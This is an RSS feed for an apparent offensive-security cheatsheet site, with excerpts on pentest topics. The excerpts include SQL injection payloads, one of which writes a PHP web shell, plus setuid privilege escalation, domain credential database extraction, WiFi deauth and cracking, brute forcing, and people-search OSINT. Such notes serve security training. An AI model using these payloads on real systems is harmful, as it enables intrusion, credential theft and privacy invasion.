<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Offensive Security Cheatsheet</title>
    <link>/</link>
    <description>Recent content on Offensive Security Cheatsheet</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>21 - FTP</title>
      <link>/network/services-enumeration/21_ftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/21_ftp/</guid>
      <description>Identification # Base connection ftp &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # It can be usefull to try passive mode ftp -p &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # Using telnet telnet &amp;lt;IP&amp;gt; 21 Anonymous test bin (binary mode, don\&amp;#39;t forget it before transfering exe file) get / send # FTP Web Access ? # Try upload and execute through web access ftp://IP Bruteforce hydra -L users.txt -P passwords.</description>
    </item>
    
    <item>
      <title>Automated Recon</title>
      <link>/windows-systems/privilege-escalation/automated_recon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/automated_recon/</guid>
      <description>Binaries Information https://lolbas-project.github.io/# python3 gtfo -e Certutil.exe Local Exploit Suggester # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/xxx/Documents/Galactic/systeminfo.txt # Metasploit also has a module &amp;gt; use post/multi/recon/local_exploit_suggester msf5 post(multi/recon/local_exploit_suggester) &amp;gt; options Module options (post/multi/recon/local_exploit_suggester): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on SHOWDESCRIPTION false yes Displays a detailed description for the available exploits msf5 post(multi/recon/local_exploit_suggester) &amp;gt; set SESSION 1 SESSION =&amp;gt; 1 msf5 post(multi/recon/local_exploit_suggester) &amp;gt; run [*] 10.</description>
    </item>
    
    <item>
      <title>Bash</title>
      <link>/linux-systems/programing-languages/bash/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/programing-languages/bash/</guid>
      <description>General &amp;amp; Tricks # base program int main(void) { system(&amp;#34;ls /path/to/.passwd&amp;#34;); return 0; } # As you as the program is executed with the ‘s’ flag (owner rights), you can privesc by copying the program you want to impersonate cp /bin/cat /tmp/ls PATH=/tmp # You can escape options echo &amp;#39;#!/bin/cat --&amp;#39; &amp;gt; /tmp/ls chmod 755 /tmp/ls env PATH=/tmp ./binary_setuid .passwd Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to/.</description>
    </item>
    
    <item>
      <title>BurpSuite</title>
      <link>/web-pentest/tools/burpsuite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/tools/burpsuite/</guid>
      <description>WORK IN PROGRESS Notes / Tips # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox sends an HTTP GET every 60s to hxxp://detectportal.firefox.com. To avoid : about:config &amp;gt; network.captive-portal-service.enabled ==&amp;gt; false Modules / Addons # Autorize # For Each Request you do, it will send an equal request # But with changed cookies of the session or any additional header used for authorization.</description>
    </item>
    
    <item>
      <title>Content Discovery</title>
      <link>/web-pentest/resources-discovery/content_discovery/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/resources-discovery/content_discovery/</guid>
      <description>Resources # Fuzzing Wordlists https://github.com/fuzzdb-project/fuzzdb # Fuzzing and Content Discovery https://github.com/kaimi-io/web-fuzz-wordlists Tips # Fuzz non-printable characters in any user input # Could result in regex bypass, account takeover... 0x00, 0x2F, 0x3A, 0x40, 0x5B, 0x60, 0x7B, 0xFF %00, %2F, %3A, %40, %5B, %60, %7B, %FF Scrapping from JS # You can parse and scrape javascript content in a target website to look for hidden subdomains or interesting paths # Often, endpoints are not public but users can still interact with them # Tools like dirscraper automates this (https://github.</description>
    </item>
    
    <item>
      <title>Defensive OSINT and CTI</title>
      <link>/defensive-monitoring-cti/defensive_osint_cti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/defensive-monitoring-cti/defensive_osint_cti/</guid>
      <description>[WIP]
Monitoring Certificate Transparendy https://certstream.calidog.io/ # Real-time certificate transparency log update stream. # See SSL certificates as they&amp;#39;re issued in real time.  https://certstream.calidog.io/example.json # All Certstreams Github repos https://github.com/search?q=org%3ACaliDog+certstream # Certstream server https://github.com/CaliDog/certstream-server https://github.com/CaliDog/certstream-server-python # Certstream https://github.com/CaliDog/certstream-python </description>
    </item>
    
    <item>
      <title>Easy - No Protections</title>
      <link>/pwn/buffer-overflow/easy_no_protection/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/pwn/buffer-overflow/easy_no_protection/</guid>
      <description>Simple Buffer Overflow (no protection) - Function call # Code void copy_ordre(char *arg) { char ordre[50]; strcpy(ordre,arg); printf(&amp;#34;\nOrdre reçu : %s\n\n&amp;#34;,ordre); } int main(int argc, char** argv) { if(argc &amp;lt; 2) { printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\n&amp;#34;); printf(&amp;#34;Usage: %s &amp;lt;ordre&amp;gt;\n&amp;#34;, argv[0]); exit(0); } printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons.</description>
    </item>
    
    <item>
      <title>Exploitation Tricks</title>
      <link>/windows-systems/exploitation/exploitation_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/exploitation_tricks/</guid>
      <description>Obfuscation # There are many ways you can use to obfuscate conten # PyFuscation (https://github.com/CBHue/PyFuscation) bring small usefull features $ python3 PyFuscation.py -fvp --ps ./Scripts/Invoke-Mimikatz.ps1 Monitoring LDAP changes during attacks - LDAPMonitor https://github.com/p0dalirius/LDAPmonitor # Monitor creation, deletion and changes to LDAP objects live during your pentest or system administration! # You need to be administrator in order to access events ID ./LDAPmonitor.py -d domain.local -u Admin -p &amp;#34;password&amp;#34; --dc-ip xx.xx.xx.xx &amp;ldquo;Double Hop&amp;rdquo; - What is it and how to solve ?</description>
    </item>
    
    <item>
      <title>General Informations</title>
      <link>/pwn/general_infos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/pwn/general_infos/</guid>
      <description>MISC - Tricks # Checking program/binary protections checksec --file ./binary # Getting more informations about an ELF readelf -a ./binary # Gettign system() adress # Can be simple objdump -D ./binary | grep system # Getting known string (&amp;#34;GNU&amp;#34; for example) # Look for objdump -s ./binary # Getting padding using pwntools &amp;gt;&amp;gt; from pwn import * # Generate pattern &amp;gt;&amp;gt; cyclic(400) ## Find offset where SIGSEGV &amp;gt;&amp;gt; find_cyclic(&amp;#39;&amp;lt;RSPoffset&amp;gt;&amp;#39;) &amp;gt;&amp;gt; find_cyclic(&amp;#39;yaac&amp;#39;) # You can list gadgets using ROPGadgets.</description>
    </item>
    
    <item>
      <title>General Infosec</title>
      <link>/resources/general_infosec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/resources/general_infosec/</guid>
      <description>Training/CTF/Challenges Resources   Resources, cheatsheets etc about EVERYTHING (https://github.com/trimstray/the-book-of-secret-knowledge)
  Burp Suite: In Depth Survival Guide (Udemy course) (https://www.udemy.com/course/burp-suite-in-depth-survival-guide/)
  TheBlackSide, challenges / CTF (https://theblackside.fr/)
  HackTheBox video WU (https://ippsec.rocks/#)
  CyberDefenders (Blueteam challenges) (https://cyberdefenders.org/)
  CyberSoc Wales (OSINT challenges) (https://investigator.cybersoc.wales)
  BTLO (Blue Team Labs Online) (https://blueteamlabs.online/login)
  Hacktoria (Realists and complex OSINT challenges) (https://hacktoria.com/)
  Network &amp;amp; Pentest  Network Pivoting (https://orangecyberdefense.</description>
    </item>
    
    <item>
      <title>Global Tricks (sysadmin)</title>
      <link>/linux-systems/tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/tricks/</guid>
      <description>[WIP]
MISC / TIPS # If you need to kill a specific process using a given port sudo fuser -k 445/tcp # You can use the following trick to easy navigate and select paths or others args # $_ takes the last argument of the last simplec command executed cd $_ # For example mkdir my-folder &amp;amp;&amp;amp; cd $_ # You can use xclip to automate clipping # Can be usefull for long outputs (enum4linux, privcheck.</description>
    </item>
    
    <item>
      <title>Google</title>
      <link>/open-source-intelligence-osint/platforms-hunting/google/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/google/</guid>
      <description>Linking to Google Account https://medium.com/week-in-osint/keeping-a-grip-on-googleids-506814ae098b https://subfn.net/2020/06/15/ga-osint-trick/ # Using Google Analytics, you can check if a non-google e-mail address is linked to a Google account # Log into Google Analytics # Navigate to Admin &amp;gt; Account User Management &amp;gt; Add user # At this point, enter an email address. If the email is a backup email of a Google account, the primary Google email (e.g. the Google login email) will be disclosed # Automated tool for identifying Google account, getting ID and relations on Google services # Works like a charm (from https://epieos.</description>
    </item>
    
    <item>
      <title>Google Dorks</title>
      <link>/open-source-intelligence-osint/dorks/google_dorks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/dorks/google_dorks/</guid>
      <description>Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.</description>
    </item>
    
    <item>
      <title>Hashcat Cheatsheet</title>
      <link>/passcracking-hashfiles/hashcat_cheatsheet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/passcracking-hashfiles/hashcat_cheatsheet/</guid>
      <description>MISC and tricks https://www.notsosecure.com/one-rule-to-rule-them-all/ # MAX POWER # force the CUDA GPU interface, optimize for &amp;lt;32 char passwords and set the workload to insane (-w 4). # It is supposed to make the computer unusable during the cracking process # Finnally, use both the GPU and CPU to handle the cracking --force -O -w 4 --opencl-device-types 1,2 Wrapcat - Automating hashcat commands https://twitter.com/Haax9_/status/1340354639464722434?s=20 https://github.com/Haax9/Wrapcat $ python wrapcat.py -m 1000 -f HASH_FILE.</description>
    </item>
    
    <item>
      <title>Information Gathering</title>
      <link>/open-source-intelligence-osint/company_investigations/company_informations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/company_investigations/company_informations/</guid>
      <description>Company Informations General # Find informations about a company https://opencorporates.com # Giant database projects containing many informations # Can be about leaks, offshore companies leaks etc https://aleph.occrp.org/ https://offshoreleaks.icij.org/ # Notices / Gazettes for EU companies http://opengazettes.com/ # Societe.ninja can give great informations about a company https://societe.ninja/ # Pappers.com is dedicated to French companies https://www.pappers.fr/ # OSINT World Map with dedicated services per countries # Really usefull resource https://cipher387.github.io/osintmap/ Financial &amp;amp; Administrative # Legal and Financial informations (might not be free for full informations) https://www.</description>
    </item>
    
    <item>
      <title>IP Address</title>
      <link>/open-source-intelligence-osint/technical-recon/ip_address/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/ip_address/</guid>
      <description>Getting Informations Whois and ASN # Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com # myip.ms can provie additional informations https://myip.ms/ # Get ASN for your target bgp.he.net # Pear is a tool used to get informations about an AS https://github.com/routeur/Pear python3 Pear.py -a [ASNumber] # You can identify IP block owned by a company ipv4info.com # IP Reputation https://reputation.team-cymru.com/ Online Scanners # Shodan.io and Censys.</description>
    </item>
    
    <item>
      <title>IPBX</title>
      <link>/other-systems/ipbx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/ipbx/</guid>
      <description># You can browse to the following URL to get all users registered with an extension 178.33.47.167/panel/ # Sipvicious is a great tool to attack VoIP # You can bruteforce a special extension/account ./svcrack.py -u 2000 178.33.47.167 -d ./notre_dictionnaire -vv </description>
    </item>
    
    <item>
      <title>Local Recon and Enumeration</title>
      <link>/windows-systems/local-and-physical/local_recon_enumeration/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/local-and-physical/local_recon_enumeration/</guid>
      <description>Tips # Powershell whoami $env:UserName # Display hidden files dir /a # Recursive dir dir /s # If you can&amp;#39;t browse a folder because of space char # You can use an old trick # It has to be 8 chars  cmd&amp;gt; cd progra~1 cmd&amp;gt; cd progra~2 Enumeration - Host Information # Exact OS version type C:/Windows/system32/eula.txt type C:\Windows\System32\drivers\etc\hosts # OS Arch systeminfo wmic qfe # Envionment variables ? DC on the logon server ?</description>
    </item>
    
    <item>
      <title>Masscan Cheatsheet</title>
      <link>/network/port-scanning/masscan_cheatsheet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/port-scanning/masscan_cheatsheet/</guid>
      <description>Usage and Options Target speficication # Target specification masscan 10.0.0.1 masscan 10.0.0.0/24 192.168.1.0/24 # Exclude IP file masscan 10.0.0.1/24 --excludeFile &amp;lt;file&amp;gt; # Exclude a single IP from the scan masscan 180.215.0.0/16 --exclude=180.215.122.120 Port specification # Port specification masscan 10.0.0.0.1 -p 80 masscan 10.0.0.0.1 -p 0-65535 masscan 10.0.0.0.1 -p 80,443 # UDP Scan masscan 10.0.0.0.1 -pU 53 Timing and Performance # Used to scan in offline mode # It does not send any traffic but just estimate the time length masscan 0.</description>
    </item>
    
    <item>
      <title>Methodology</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/methodology/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/methodology/</guid>
      <description>Gap Analysis &amp;amp; others # In OSINT - Analytical mind # Ask a lot of questions : Who, What, When, Where, Why, and How # Be Curious and Craft a Storyline # Use Gap Analysis shttps://nixintel.info/osint/using-gap-analysis-to-keep-osint-investigations-on-track/ 1. What do we know ? 2. What does the information mean? 3. What do I still need to know? 4. How do I find out? # Reflect on failures but also wins 1. What part is taking the most time?</description>
    </item>
    
    <item>
      <title>Methodology</title>
      <link>/shells-methods/methodology/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/methodology/</guid>
      <description>https://dolosgroup.io/blog/remote-access-cheat-sheet
GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
    </item>
    
    <item>
      <title>NTDS Database</title>
      <link>/windows-systems/post-exploitation-techniques/ntds_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/ntds_database/</guid>
      <description># Initial location of the NTDS database on the domain controller C:\Windows\NTDS\NTDS.dit # Step 1 → Finding a way to get the NDTS.dis and SYSTEM file # Step 2 → Crack/Analyze offline Local Extraction VSSadmin # Récupération via VSSadmin # Create a Volume Shadow Copy C:\Windows\system32&amp;gt; vssadmin create shadow /for=C: # Retrieve NTDS from the copy C:\Windows\system32&amp;gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit # Copy SYSTEM file C:\Windows\system32&amp;gt; reg SAVE HKLM\SYSTEM c:\Extract\SYS C:\Windows\system32&amp;gt; copy \\?</description>
    </item>
    
    <item>
      <title>Out of Domain (No credentials)</title>
      <link>/windows-systems/network-and-domain-recon/no_credentials_recon/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/network-and-domain-recon/no_credentials_recon/</guid>
      <description>Identification # Passiv network listening to identify machines # By default, it uses interactive mode (incompatible with clean output) # You can use the -P option to get off interactive sudo netdiscover -p -i eth0 sudo netdiscover -p -i eth0 -P # You can find the domain big using dig dig -x IP # If the NAC is blocking, you can listen broadcast and collect MAC address # Use printer&amp;#39;s MAC address to bypass NAC LLMNR / NBT-NS # You can Man in The Middle using LLMNR and NBT-NS if they&amp;#39;re bad configured sudo responder -I eth0 -wFv # If you get hashes, will be necessary to crack them john --format=netntlmv2 --wordlist=&amp;#34;/usr/share/wordlists/rockyou.</description>
    </item>
    
    <item>
      <title>Phishing Infrastructure (Gophish&#43;Vultr)</title>
      <link>/phishing-redteam-and-se/phishing_campaign_setup/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/phishing-redteam-and-se/phishing_campaign_setup/</guid>
      <description>General Informations # Using a specific and dedicated machine is a good choice. # It avoid being indexed and referenced as a phishing server for your own VPS # All the server configuration is pulled from the following Github repository # it provides a fully functionnal bash script to automate the process https://github.com/n0pe-sled/Postfix-Server-Setup # Generate typo &amp;amp; permutations on a domain name https://dnstwister.report/ # Message Header Analyzer https://mha.azurewebsites.net/ # The Spamhaus Project # Interesting stats about The World&amp;#39;s Most Abused TLDs.</description>
    </item>
    
    <item>
      <title>PHP Filters</title>
      <link>/web-pentest/php-vulnerabilities/php_filters/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/php_filters/</guid>
      <description>PHP Filters # Base64 ?inc=php://filter/read=convert.base64-encode/resource=config.php # iconv conversion filter can be used (https://gynvael.coldwind.pl/?lang=en&amp;amp;id=671) # allows you to use iconv to convert all processed data from charset A to charset B # where both character sets can be chosen from a surprisingly long list of supported encodings iconv -l # Example &amp;lt;?php $url = &amp;#34;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&amp;lt;&amp;gt;text&amp;#34;; echo file_get_contents($url); // Output: // some+ADwAPg-text # Then you can use it to change the charset of your payload php://filter/convert.</description>
    </item>
    
    <item>
      <title>Pivot Techniques</title>
      <link>/network/pivot_techniques/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/pivot_techniques/</guid>
      <description>https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/
Proxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D &amp;lt;local_port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 &amp;lt;local_port&amp;gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains... # Scanning (nmap) can be very long through proxychains # You can speed it up by using xargs and multithreading # The main goal is to spread ports between different threads (-P 50) $ seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.</description>
    </item>
    
    <item>
      <title>Recon-ng</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/recon-ng/</guid>
      <description>General Informations https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide # Its possible to add your own modules # Reconnaissance → Usage of open sources (passive) # Discovery → More active, packets sent to target # After loading a module, the context of the framework changes, and a new set of commands and options are available.  # These commands and options are unique to the module. (help / show) Usage # Add API keys &amp;gt; keys add shodan_api &amp;lt;key&amp;gt; &amp;gt; keys list # Modules &amp;gt; show modules &amp;gt; search &amp;lt;string&amp;gt; &amp;gt; use recon/domains-hosts/builtwith &amp;gt; show infos &amp;gt; set &amp;lt;param&amp;gt; &amp;lt;value&amp;gt; # Workspaces &amp;gt; show workspaces &amp;gt; workspaces list &amp;gt; workspaces add Name &amp;gt; workspaces select &amp;lt;ws&amp;gt; # Add companies and domains to a schema &amp;gt; show schema &amp;gt; add compagnies company &amp;gt; add domains domain.</description>
    </item>
    
    <item>
      <title>RSA Encryption</title>
      <link>/cryptography/rsa/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/cryptography/rsa/</guid>
      <description>Resources https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/ # Think about factordb.com to retrieve p and q from n Theory # Used # c → cyphertext # m → Plaintext message converted as a number # e → public exponent # d → private exponent # n → modulo =&amp;gt; p * q # Encrypt c = (m^e)[n] =&amp;gt; pow(m,e,n) # Decrypt m = (c^d)[n] =&amp;gt; pow(c,d,n) # 5 times encryption c = m^(e1 * e2 * e3 * e4 * e5) m = c^(d1 * d2 * d3 * d4 * d5) # Can get n and e from openssl like this cat alice_pubkey.</description>
    </item>
    
    <item>
      <title>Searching Someone</title>
      <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
      <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43 https://www.aware-online.com/en Searching People # Very good and accurate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/ # Good search engine, different kinds of data https://webmii.com/ # Kinda amazing resource # Finding company related data about a person https://aleph.occrp.org # Dead people registry (EU) https://deces.matchid.io # French search engine for dead people https://www.</description>
    </item>
    
    <item>
      <title>SQL Injections</title>
      <link>/web-pentest/injections/server-side-injections/sql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/sql/</guid>
      <description>Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1 -- - &#39; or 1=1 LIMIT 1# &#39;or 1# &#39; or 1=1 -- &#39; or 1=1 -- - admin\&#39;-- - # Upload file union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39; # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users # Dump In One Shot (Shoot): \&#39; unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.</description>
    </item>
    
    <item>
      <title>System Tricks</title>
      <link>/linux-systems/privilege-escalation/system_tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/privilege-escalation/system_tricks/</guid>
      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://marc.info/?l=full-disclosure&amp;amp;m=128776663124692&amp;amp;w=2 # Search for a binary privesc python3 gtfo -b systemctl Recon and Enumeration # Look for strange process ps aux # Look for setuid programs (everyone can run them as root) find / -perm -4000 # Example, if perl perl -e ‘$ENV{PATH}=&amp;#34;/usr/bin&amp;#34;;system(&amp;#34;whoami&amp;#34;);’ → root # List processes running as root, permissions and NFS exports echo &amp;#39;services running as root&amp;#39;; ps aux | grep root; echo &amp;#39;permissions&amp;#39;; ps aux | awk &amp;#39;{print $11}&amp;#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &amp;#39;!</description>
    </item>
    
    <item>
      <title>URL Shortener &amp; Redirect</title>
      <link>/open-source-intelligence-osint/technical-recon/misc/url_shortener/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/misc/url_shortener/</guid>
      <description>Short URL &amp;amp; Redirections # Get informations about a shortened link https://checkshorturl.com # Find where does redirection go http://redirectdetective.com/ # Get information directly from the creator (bitly for example # Add + at the the end (you can get creation date) https://bit.ly/3b7QP9M https://bit.ly/3b7QP9M+ # bit.ly - add + at the end # http://cutt.ly - add @ # http://tiny.cc - add = # http://tinyurl.com - add preview. before http://tinyurl.com Redirections # These tools allow you to check redirection and resolving path for a given target URL https://redirectdetective.</description>
    </item>
    
    <item>
      <title>Web Application Scans</title>
      <link>/web-pentest/applicative-scans/web_application_scan/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/applicative-scans/web_application_scan/</guid>
      <description>API Endpoints wordlist https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.</description>
    </item>
    
    <item>
      <title>WiFi Cracking</title>
      <link>/wireless/wifi_cracking/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/wireless/wifi_cracking/</guid>
      <description>General Informations # Bypass MAC filter macchanger –m B0:D0:9C:5C:EF:86 wlan0 Monitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the monitor mode sudo airmon-ng start wlan0mon # Simple passive listening and capture # Used to discover AP in the environment sudo airodump-ng wlan0mon # Targetted listening and capture # Focus on one AP and one channel sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile Attacking WEP # WEP is an old encryption protocol but still used in some places # It is vulnerable to direct cracking attacks # The only requirement is to get enough IV # The process can be enhanced by sending deauth packets # -0 == detauth attack, sending 3 packets (can be increased) aireplay-ng -0 3 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon -w # Another possibility is to use fake authentication to generate IV # -1 = fake authentication # 0 = delay between association demands # -e = AP ESSID (name) # -a = AP MAC # -h = attacker MAC aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # ARP Sniffing and injection is another method aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 wlan0mon # Using aircrack-ng it is possible to directly crack the WEP Key aircrack-ng outfile -w wordlist Attacking WPA2 PSK (The old way) # Using the aircrack-ng suite # You can first focus one AP using airodump-ng (see monitoring section) # Here, you want to get the 4-way WPA Handshake # It requires network traffic between the AP and one device # Dumping sudo airodump-ng wlan0mon --bssid xx:xx:xx:xx:xx:xx –c 1 –w outfile # Deauth connected devices to initiate authentication process and try to get the handshake aireplay-ng --deauth 15 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon aireplay-ng -0 15 -a &amp;lt;TARGET_AP_MAC&amp;gt; wlan0mon # In the airodump-ng console, the WPA handshake will appear once captured # Cracking can be done using aircrack-ng aircrack-ng outfile -w wordlist # But also using other tools like hashcat # The outfile needs to be an HCCAPX file # Hashcat utils provide a binary to convert .</description>
    </item>
    
    <item>
      <title>Wordpress</title>
      <link>/web-pentest/content-management-system-cms/wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/wordpress/</guid>
      <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files # Get WPEngine&amp;#39;s config file /_wpeprivate/config.</description>
    </item>
    
    <item>
      <title>XSS Injections</title>
      <link>/web-pentest/injections/client-side-injections/xss/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/client-side-injections/xss/</guid>
